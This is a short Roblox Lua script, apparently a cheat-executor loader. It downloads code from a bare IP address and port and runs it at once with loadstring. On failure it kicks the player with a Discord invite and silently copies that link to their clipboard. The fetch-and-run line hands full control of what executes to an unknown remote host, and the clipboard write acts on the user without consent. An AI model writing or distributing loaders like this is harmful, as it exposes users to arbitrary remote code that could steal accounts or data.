local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local a, b = pcall(function() 
    return game:HttpGet("http://212.132.120.102:14976/get_script")
end)

if a then
  loadstring(b)()
elseif not a then
  LocalPlayer:Kick("Something went wrong please join our discord server \nhttps://discord.gg/9AfQVkY5wu")
  setclipboard("https://discord.gg/9AfQVkY5wu")
end
